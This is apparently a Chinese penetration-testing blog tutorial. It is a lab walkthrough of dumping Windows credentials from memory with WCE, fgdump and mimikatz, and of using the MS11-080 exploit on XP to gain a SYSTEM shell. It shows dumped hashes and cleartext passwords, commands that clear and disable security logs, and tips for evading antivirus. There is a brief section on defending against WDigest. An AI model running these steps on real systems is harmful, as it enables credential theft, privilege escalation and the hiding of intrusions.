<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">apt-get install wce  </span><br><span class="line">root@kali:/usr/share/windows-resources/wce<span class="comment"># ls  </span></span><br><span class="line">getlsasrvaddr.exe  README  wce32.exe  wce64.exe  wce-universal.exe</span><br></pre></td></tr></table></figure>
<p><strong>help</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wce&gt;wce-universal.exe -h</span><br><span class="line">WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by</span><br><span class="line">Hernan Ochoa (hernan@ampliasecurity.com)</span><br><span class="line">Use -h <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line">Options:</span><br><span class="line">        -l              List logon sessions and NTLM credentials (default).</span><br><span class="line">        -s              Changes NTLM credentials of current logon session.</span><br><span class="line">                        Parameters: &lt;UserName&gt;:&lt;DomainName&gt;:&lt;LMHash&gt;:&lt;NTHash&gt;.</span><br><span class="line">        -r              Lists logon sessions and NTLM credentials indefinitely.</span><br><span class="line">                        Refreshes every 5 seconds <span class="keyword">if</span> new sessions are found.</span><br><span class="line">                        Optional: -r&lt;refresh interval&gt;.</span><br><span class="line">        -c              Run &lt;cmd&gt; <span class="keyword">in</span> a new session with the specified NTLM credentials.</span><br><span class="line">                        Parameters: &lt;cmd&gt;.</span><br><span class="line">        -e              Lists logon sessions NTLM credentials indefinitely.</span><br><span class="line">                        Refreshes every time a logon event occurs.</span><br><span class="line">        -o              saves all output to a file.</span><br><span class="line">                        Parameters: &lt;filename&gt;.</span><br><span class="line">        -i              Specify LUID instead of use current logon session.</span><br><span class="line">                        Parameters: &lt;luid&gt;.</span><br><span class="line">        -d              Delete NTLM credentials from logon session.</span><br><span class="line">                        Parameters: &lt;luid&gt;.</span><br><span class="line">        -a              Use Addresses.</span><br><span class="line">                        Parameters: &lt;addresses&gt;</span><br><span class="line">        -f              Force <span class="string">&#x27;safe mode&#x27;</span>.</span><br><span class="line">        -g              Generate LM &amp; NT Hash.</span><br><span class="line">                        Parameters: &lt;password&gt;.</span><br><span class="line">        -K              Dump Kerberos tickets to file (unix &amp; <span class="string">&#x27;windows wce&#x27;</span> format)</span><br><span class="line">        -k              Read Kerberos tickets from file and insert into Windowscache</span><br><span class="line">        -w              Dump cleartext passwords stored by the digest authentication package</span><br><span class="line">        -v              verbose output.</span><br></pre></td></tr></table></figure>
<p><strong>参数：</strong></p>
<p><strong>-l
：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】</strong></p>
<p><strong>-lv：表示查看更详细的信息【注入模式可能会对系统进程造成损坏】</strong></p>
<p><strong>-r：每隔几秒去重新读下，看有没有新账户登录（默认5s）。</strong></p>
<p><strong>-d：通过指定LUID删除某一会话。</strong></p>
<p><strong>-g：计算指定密码的LM和NTLM哈希值。</strong></p>
<p><strong>-w：读内存中 WDisgest 安全包维护的 </strong>当前登录账户的**
明文密码。**</p>
<p><strong>注意：wce是从内存中读取，pwdump是从数据库SAM中读取的！</strong></p>
<p><strong>示例</strong></p>
<p>将wce整个文件夹拷到测试机（以xp_sp3为例），在xp上多建几个账号并通过切换用户使其分别处于登录状态。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214223241840-1233540182.png" /></p>
<p><strong>参数 -l:</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214223318221-1481708549.png" /></p>
<p><strong>参数 -lv:</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214224231429-534159364.png" /></p>
<p><strong>参数 -r:</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214225558635-1011121127.png" /></p>
<p><strong>登录 a 账户</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214225904762-1020174564.png" /></p>
<p><strong>参数 -d:</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214231819082-1470633209.png" /></p>
<p><strong>参数 -g：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214232244460-299934841.png" /></p>
<p><strong>参数 -w：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214232536042-152240367.png" /></p>
<p><strong>参数 -i + -s（修改指定会话的登录信息）：</strong></p>
<p><strong>如：将 a 的登录会话修改成 administrator 账号</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214234734619-1477499615.png" /></p>
<h2 id="wce攻击防御">3. WCE攻击防御</h2>
<p><strong>由于系统是通过 Digest Authentication Package
在内存中维护明文密码，默认自启动，为此可去注册表中关闭默认启动。</strong></p>
<p>**注册表路径：HKEY_LOCAL_MACHINE*</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215003608387-1653855160.png" /></p>
<p><strong>Security Packages默认项：</strong></p>
<ul>
<li>kerberos</li>
<li>msv1_0</li>
<li>schannel</li>
<li><strong>wdigest 本地内存维护明文密码</strong></li>
<li><strong>tspkg 远程终端维护……</strong></li>
<li>pku2u</li>
</ul>
<h2 id="相似工具">4. 相似工具</h2>
<h3 id="pwdump">1、pwdump</h3>
<p><strong>参见：</strong><a
href="https://www.cnblogs.com/z9m8r8/articles/15892054.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15892054.html</a></p>
<h3 id="fgdump">2、fgdump</h3>
<p><strong>Kali路径：</strong> /usr/share/windows-binaries/fgdump</p>
<p><strong>XP演示：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215010402058-1248608971.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215010611019-51739554.png" /></p>
<h3 id="mimikatz">3、mimikatz</h3>
<p><strong>Kali 路径：</strong>
/usr/share/windows-resources/mimikatz</p>
<p><strong>帮助信息（用双冒号查看命令模块和子模块）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**C:\Documents and Settings\Administrator\Desktop\mimikatz\Win32 &gt;** **mimikatz.exe**</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #18362 May 13 2019 01:34:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/ **mimikatz <span class="comment"># ::**</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">        standard  -  Standard module  [Basic commands (does not require module name)]</span><br><span class="line">          crypto  -  Crypto Module</span><br><span class="line">        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]</span><br><span class="line">        kerberos  -  Kerberos package module  []</span><br><span class="line">       privilege  -  Privilege module</span><br><span class="line">         process  -  Process module</span><br><span class="line">         service  -  Service module</span><br><span class="line">         lsadump  -  LsaDump module</span><br><span class="line">              ts  -  Terminal Server module</span><br><span class="line">           event  -  Event module</span><br><span class="line">            misc  -  Miscellaneous module</span><br><span class="line">           token  -  Token manipulation module</span><br><span class="line">           vault  -  Windows Vault/Credential module</span><br><span class="line">     minesweeper  -  MineSweeper module</span><br><span class="line">             net  -</span><br><span class="line">           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]</span><br><span class="line">       busylight  -  BusyLight Module</span><br><span class="line">          sysenv  -  System Environment Value module</span><br><span class="line">             sid  -  Security Identifiers module</span><br><span class="line">             iis  -  IIS XML Config module</span><br><span class="line">             rpc  -  RPC control of mimikatz</span><br><span class="line">            sr98  -  RF module <span class="keyword">for</span> SR98 device and T5577 target</span><br><span class="line">             rdm  -  RF module <span class="keyword">for</span> RDM(830 AL) device</span><br><span class="line">             acr  -  ACR Module</span><br></pre></td></tr></table></figure>
<p><strong>privilege模块：提权</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;privilege&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        privilege</span><br><span class="line">Full name :     Privilege module</span><br><span class="line"></span><br><span class="line">           debug  -  Ask debug privilege</span><br><span class="line">          driver  -  Ask load driver privilege</span><br><span class="line">        security  -  Ask security privilege</span><br><span class="line">             tcb  -  Ask tcb privilege</span><br><span class="line">          backup  -  Ask backup privilege</span><br><span class="line">         restore  -  Ask restore privilege</span><br><span class="line">          sysenv  -  Ask system environment privilege</span><br><span class="line">              <span class="built_in">id</span>  -  Ask a privilege by its <span class="built_in">id</span></span><br><span class="line">            name  -  Ask a privilege by its name</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug 　　#提权到debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br></pre></td></tr></table></figure>
<p><strong>sekurlsa模块：查看登录账号密码信息等</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**mimikatz <span class="comment"># sekurlsa::**</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;sekurlsa&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        sekurlsa</span><br><span class="line">Full name :     SekurLSA module</span><br><span class="line">Description :   Some commands to enumerate credentials...</span><br><span class="line"></span><br><span class="line">             msv  -  Lists LM &amp; NTLM credentials</span><br><span class="line">         wdigest  -  Lists WDigest credentials</span><br><span class="line">        kerberos  -  Lists Kerberos credentials</span><br><span class="line">           tspkg  -  Lists TsPkg credentials</span><br><span class="line">         livessp  -  Lists LiveSSP credentials</span><br><span class="line">             ssp  -  Lists SSP credentials</span><br><span class="line">  logonPasswords  -  Lists all available providers credentials</span><br><span class="line">         process  -  Switch (or reinit) to LSASS process  context</span><br><span class="line">        minidump  -  Switch (or reinit) to LSASS minidump context</span><br><span class="line">             pth  -  Pass-the-hash</span><br><span class="line">          krbtgt  -  krbtgt!</span><br><span class="line">     dpapisystem  -  DPAPI_SYSTEM secret</span><br><span class="line">         tickets  -  List Kerberos tickets</span><br><span class="line">           ekeys  -  List Kerberos Encryption Keys</span><br><span class="line">           dpapi  -  List Cached MasterKeys</span><br><span class="line">         credman  -  List Credentials Manager</span><br><span class="line"></span><br><span class="line">**mimikatz <span class="comment"># sekurlsa::logonPasswords**</span></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 242726 (00000000:0003b426)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : DH-CA8822AB9589</span><br><span class="line">Logon Server      : DH-CA8822AB9589</span><br><span class="line">Logon Time        : 2/15/2022 9:14:59 AM</span><br><span class="line">SID               : S-1-5-21-583907252-1757981266-1177238915-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000002] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * LM       : 44efce164ab921caaad3b435b51404ee</span><br><span class="line">         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">         * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * Password : 123456</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * Password : 123456</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2/15/2022 9:08:41 AM</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">…………………………</span><br></pre></td></tr></table></figure>
<p><strong>process模块：管理进程</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># process::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;process&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        process</span><br><span class="line">Full name :     Process module</span><br><span class="line"></span><br><span class="line">            list  -  List process</span><br><span class="line">         exports  -  List exports</span><br><span class="line">         imports  -  List imports</span><br><span class="line">           start  -  Start a process</span><br><span class="line">            stop  -  Terminate a process</span><br><span class="line">         <span class="built_in">suspend</span>  -  Suspend a process</span><br><span class="line">          resume  -  Resume a process</span><br><span class="line">             run  -  Run!</span><br><span class="line">            runp  -</span><br><span class="line">mimikatz <span class="comment"># process::start cmd</span></span><br><span class="line">Trying to start <span class="string">&quot;cmd&quot;</span> : OK ! (PID 3888)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215095339100-220935767.png" /></p>
<p><strong>service模块：服务管理</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># service::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;service&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        service</span><br><span class="line">Full name :     Service module</span><br><span class="line"></span><br><span class="line">           start  -  Start service</span><br><span class="line">          remove  -  Remove service</span><br><span class="line">            stop  -  Stop service</span><br><span class="line">         <span class="built_in">suspend</span>  -  Suspend service</span><br><span class="line">          resume  -  Resume service</span><br><span class="line">     preshutdown  -  Preshutdown service</span><br><span class="line">        shutdown  -  Shutdown service</span><br><span class="line">            list  -  List services</span><br><span class="line">               +  -  Install Me!</span><br><span class="line">               -  -  Install Me!</span><br><span class="line">              me  -  Me!</span><br></pre></td></tr></table></figure>
<p><strong>suspend子模块：挂起进程，可用于植入木马时，暂停防病毒软件。</strong></p>
<p><strong>resume子模块：进程恢复</strong></p>
<p><strong>lsadump模块</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;lsadump&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        lsadump</span><br><span class="line">Full name :     LsaDump module</span><br><span class="line"></span><br><span class="line">             sam  -  Get the SysKey to decrypt SAM entries (from registry or hives)</span><br><span class="line">         secrets  -  Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">           cache  -  Get the SysKey to decrypt NL<span class="variable">$KM</span> <span class="keyword">then</span> MSCache(v2) (from registry or hives)</span><br><span class="line">             lsa  -  Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)</span><br><span class="line">           trust  -  Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)</span><br><span class="line">      backupkeys</span><br><span class="line">          rpdata</span><br><span class="line">          dcsync  -  Ask a DC to synchronize an object</span><br><span class="line">        dcshadow  -  They told me I could be anything I wanted, so I became a domain controller</span><br><span class="line">         setntlm  -  Ask a server to <span class="built_in">set</span> a new password/ntlm <span class="keyword">for</span> one user</span><br><span class="line">      changentlm  -  Ask a server to <span class="built_in">set</span> a new password/ntlm <span class="keyword">for</span> one user</span><br><span class="line">         netsync  -  Ask a DC to send current and previous NTLM <span class="built_in">hash</span> of DC/SRV/WKS</span><br><span class="line">        packages</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam　　　　#从SAM数据库中读取账号密码</span></span><br><span class="line">Domain : DH-CA8822AB9589</span><br><span class="line">SysKey : 7be839f49edcab29c3a40fe24d47335f</span><br><span class="line">ERROR kull_m_registry_OpenAndQueryWithAlloc ;kull_m_registry_RegOpenKeyEx KO</span><br><span class="line">ERROR kuhl_m_lsadump_getUsersAndSamKey ;kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)</span><br></pre></td></tr></table></figure>
<p><strong>ts模块：终端服务，默认情况下XP只允许一个活动的登录会话</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215110113398-916664867.png" /></p>
<p><strong>相当于打上一个补丁，使多个会话可以并行，即多用户登录。</strong></p>
<p><strong>event模块：日志管理</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># event::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;event&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        event</span><br><span class="line">Full name :     Event module</span><br><span class="line"></span><br><span class="line">            drop  -  [experimental] patch Events service to avoid new events</span><br><span class="line">           clear  -  Clear an event <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># event::clear</span></span><br><span class="line">Using <span class="string">&quot;Security&quot;</span> event <span class="built_in">log</span> :</span><br><span class="line">- 0 event(s)</span><br><span class="line">- Cleared !</span><br><span class="line">- 1 event(s)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># event::drop</span></span><br></pre></td></tr></table></figure>
<p><strong>clear：清除已记录的安全日志等</strong></p>
<p><strong>drop：不在进行新的日志记录</strong></p>
<p><strong>misc模块：杂项</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215110500854-1551202711.png" /></p>
<p><strong>token模块</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># token::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;token&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        token</span><br><span class="line">Full name :     Token manipulation module</span><br><span class="line"></span><br><span class="line">          <span class="built_in">whoami</span>  -  Display current identity</span><br><span class="line">            list  -  List all tokens of the system</span><br><span class="line">         elevate  -  Impersonate a token</span><br><span class="line">             run  -  Run!</span><br><span class="line">          revert  -  Revert to proces token</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::whoami</span></span><br><span class="line"> * Process Token : &#123;0;0002ed48&#125; 0 - 333441      DH-CA8822AB9589\Administrator S-1-5-21-583907252-1757981266-1177238915-500    (08g,20p)       Primary</span><br><span class="line"> * Thread Token  : no token</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：利用漏洞提权</title>
    <url>/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="ms11-080漏洞演示">1. Ms11-080漏洞演示</h2>
<ul>
<li><strong>Kb2592799（补丁编号）</strong></li>
<li>https://technet.microsoft.com/library/security/ms11-080</li>
</ul>
<p><strong>Kali：searchsploit命令查找漏洞</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ms11-080</span></span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">                                        | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Windows - <span class="string">&#x27;AfdJoinLeaf&#x27;</span> Local | exploits/windows/local/21844.rb</span><br><span class="line">Microsoft Windows XP/2003 - <span class="string">&#x27;afd.sys&#x27;</span> L | exploits/windows/local/18176.py</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215120449465-1747440424.png" /></p>
<ul>
<li>通过Afd.sys文件进行提权</li>
<li>适用32位系统，XP和2003，Eng：表示适用于英文版操作系统，可能在中文上不适用</li>
<li>将18176.py拷贝到XP系统中【注：XP需安装python环境】</li>
</ul>
<p><strong>检查xp是否已安装补丁</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215121731454-1119660422.png" /></p>
<p><strong>若目标系统没有自己需要的编译环境，可先在自己的环境中将代码编译成
exe 执行程序，再在目标上执行。</strong></p>
<p><strong>python代码编译成 exe 所需组件</strong></p>
<p><strong>• Pywin32</strong></p>
<p>• <a
href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download"
class="uri">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download</a></p>
<p><strong>python环境安装：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215122554975-554350476.png" /></p>
<p><strong>• Pyinstaller【作用：将其他python脚本转换为exe】</strong></p>
<p>• <a href="https://pypi.python.org/pypi/PyInstaller/2.1"
class="uri">https://pypi.python.org/pypi/PyInstaller/2.1</a></p>
<p><strong>将解压的pyinstaller放到python27中，将18176.py放到pyinstaller文件中。</strong></p>
<p><strong>通过 cmd 编译</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Python27\PyInstaller-2.1&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\Python27\PyInstaller-2.1</span><br><span class="line"></span><br><span class="line">02/15/2022  12:39 PM    &lt;DIR&gt;          .</span><br><span class="line">02/15/2022  12:39 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/15/2022  12:01 PM            12,215 18176.py</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          bootloader</span><br><span class="line">02/15/2022  12:26 PM    &lt;DIR&gt;          doc</span><br><span class="line">02/15/2022  12:26 PM    &lt;DIR&gt;          old</span><br><span class="line">09/18/2013  08:14 PM             3,429 PKG-INFO</span><br><span class="line">02/15/2022  12:30 PM    &lt;DIR&gt;          PyInstaller</span><br><span class="line">01/31/2013  11:20 AM             3,444 pyinstaller-gui.py</span><br><span class="line">03/20/2013  10:22 PM               555 pyinstaller.py</span><br><span class="line">09/15/2013  10:27 PM             6,544 setup.py</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          tests</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          utils</span><br><span class="line">               5 File(s)         26,187 bytes</span><br><span class="line">               8 Dir(s)  38,400,126,976 bytes free</span><br><span class="line"></span><br><span class="line">C:\Python27\PyInstaller-2.1&gt;..\python.exe pyinstaller.py --onefile 18176.py</span><br><span class="line">437 INFO: wrote C:\Python27\PyInstaller-2.1\18176\18176.spec</span><br><span class="line">484 INFO: Testing <span class="keyword">for</span> ability to <span class="built_in">set</span> icons, version resources...</span><br><span class="line">547 INFO: ... resource update available</span><br><span class="line">…………………………</span><br><span class="line">13969 INFO: Appending archive to EXE C:\Python27\PyInstaller-2.1\18176\dist\18176.exe</span><br></pre></td></tr></table></figure>
<p><strong>目标机（XPsp3）测试，为防止在上传到其他系统时，被杀毒软件拦截，可先进行压缩。由于普通用户无法在C盘写入，可新建个临时文件temp，然后解压到temp。</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215130247735-1096774761.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215130336400-384876061.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**C:\Documents and Settings\a\Desktop\ 18176&gt;<span class="built_in">whoami</span></span><br><span class="line">DH-CA8822AB9589\a</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\a\Desktop\18176&gt;net user a**</span><br><span class="line">User name                    a</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password expires             3/29/2022 9:07 PM</span></span><br><span class="line"><span class="string">Password changeable          2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/15/2022 12:55 PM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      Users</span></span><br><span class="line"><span class="string">Global Group memberships     *None</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**C:\Documents and Settings\a\Desktop\18176 &gt;net localgroup Administrators a /add</span></span><br><span class="line"><span class="string">System error 5 has occurred.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Access is denied.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a\Desktop\18176&gt;18176.exe -O XP**</span></span><br><span class="line"><span class="string">[&gt;] MS11-080 Privilege Escalation Exploit</span></span><br><span class="line"><span class="string">[&gt;] Matteo Memelli - ryujin@offsec.com</span></span><br><span class="line"><span class="string">[&gt;] Release Date 28/11/2011</span></span><br><span class="line"><span class="string">[+] Retrieving Kernel info...</span></span><br><span class="line"><span class="string">[+] Kernel version: ntkrnlpa.exe</span></span><br><span class="line"><span class="string">[+] Kernel base address: 0x804d7000L</span></span><br><span class="line"><span class="string">[+] HalDispatchTable address: 0x80545838L</span></span><br><span class="line"><span class="string">[+] Retrieving hal.dll info...</span></span><br><span class="line"><span class="string">[+] hal.dll base address: 0x806d0000L</span></span><br><span class="line"><span class="string">[+] HaliQuerySystemInformation address: 0x806e6bbaL</span></span><br><span class="line"><span class="string">[+] HalpSetSystemInformation address: 0x806e9436L</span></span><br><span class="line"><span class="string">[*] Triggering AFDJoinLeaf pointer overwrite...</span></span><br><span class="line"><span class="string">[*] Spawning a SYSTEM shell...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**C:\WINDOWS\system32&gt; whoamiNT AUTHORITY\SYSTEM**</span></span><br><span class="line"><span class="string">**C:\WINDOWS\system32&gt; net localgroup Administrators a /add</span></span><br><span class="line"><span class="string">The command completed successfully.**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;net user a</span></span><br><span class="line"><span class="string">User name                    a</span></span><br><span class="line"><span class="string">Full Name</span></span><br><span class="line"><span class="string">Comment</span></span><br><span class="line"><span class="string">User&#x27;</span>s comment</span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last <span class="built_in">set</span>            2/14/2022 10:20 PM</span><br><span class="line">Password expires             3/29/2022 9:07 PM</span><br><span class="line">Password changeable          2/14/2022 10:20 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   2/15/2022 12:55 PM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">**Local Group Memberships*Administrators       *Users**</span><br><span class="line">Global Group memberships     *None</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
